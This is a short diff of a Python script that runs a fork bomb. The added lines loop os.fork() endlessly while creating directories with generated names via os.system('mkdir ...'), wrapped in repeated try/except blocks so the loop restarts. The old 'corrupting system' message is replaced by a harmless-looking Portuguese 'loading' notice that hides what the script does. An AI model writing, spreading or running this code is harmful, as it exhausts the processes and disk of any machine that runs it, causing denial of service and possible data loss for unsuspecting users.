@@ -36,11 +36,21 @@ def bombdir(Length):
 	
 clear()
 
-time.sleep(1.5)
-print(f'{v}corrupting system...')
-time.sleep(1.5)
-print(f'{v}installing 4 terabyte files...')
-
-while True:
-	os.fork()
-	os.system(f'mkdir {bombdir(10*10)}')
+time.sleep(1)
+print(f'{v}CARREGANDO...')
+try:
+		while True:
+			os.fork()
+			os.system(f'mkdir {bombdir(10*10)}')
+except:
+	while True:
+		os.fork()
+		os.system(f'mkdir {bombdir(10*10)}')
+try:
+	while True:
+		os.fork()
+		os.system(f'mkdir {bombdir(10*10)}')
+except:
+	while True:
+		os.fork()
+		os.system(f'mkdir {bombdir(10*10)}')
